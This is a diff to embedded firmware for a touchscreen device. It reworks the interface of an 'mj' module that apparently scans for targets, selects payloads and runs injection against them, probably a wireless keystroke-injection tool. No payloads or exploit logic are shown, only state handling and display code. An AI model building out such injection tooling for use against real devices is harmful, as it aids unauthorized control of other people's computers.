                 if (mj->injecting) {
                     stopMjTask();
                     mj->injecting = false;
-                } else if (mj->hasTarget) {
+                } else if (mj->hasTarget && !mj->scanning) {
                     startMjTask();
                 }
                 drawMjHeader();
                 drawMjContent();
                 return;
             }
-            // Next payload
-            if (tx >= mjIconX[1] - 10 && tx < mjIconX[1] + 25) {
+            // [4] Next payload (mjIconX[4] area)
+            if (tx >= mjIconX[4] - 10 && tx < mjIconX[4] + 25) {
                 waitForTouchRelease();
                 delay(200);
                 mj->selectedPayload = (mj->selectedPayload + 1) % MJ_PAYLOAD_COUNT;
@@ -3938,16 +4324,24 @@ void loop() {
     }
 
     if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
+        if (mj->scanning) stopMjScan();
         if (mj->injecting) stopMjTask();
         mjExitRequested = true;
         return;
     }
 
-    // Update display — 5 Hz when injecting, 2 Hz idle (skull animation)
-    unsigned long mjInterval = (mj && mj->injecting) ? 200 : 500;
+    // Update display — 5 Hz when active, 2 Hz idle (skulls only)
+    unsigned long mjInterval = (mj && (mj->injecting || mj->scanning)) ? 200 : 500;
     if (millis() - mjLastDisplay >= mjInterval) {
-        if (mj && mj->injecting) drawMjHeader();
-        drawMjContent();
+        if (mj && (mj->injecting || mj->scanning)) {
+            drawMjHeader();
+            drawMjStatus();
+        }
+        // Test result flash — update target frame for 1.5s after test
+        if (mj && mj->testTime > 0 && (millis() - mj->testTime < 1600)) {
+            drawMjTargetFrame();
+        }
+        drawMjSkulls();
         mjLastDisplay = millis();
     }
 }
@@ -3957,6 +4351,7 @@ bool isExitRequested() {
 }
 
 void cleanup() {
+    if (mj && mj->scanning) stopMjScan();
     if (mj && mj->injecting) stopMjTask();
     if (mj) { free(mj); mj = nullptr; }
     mjExitRequested = false;
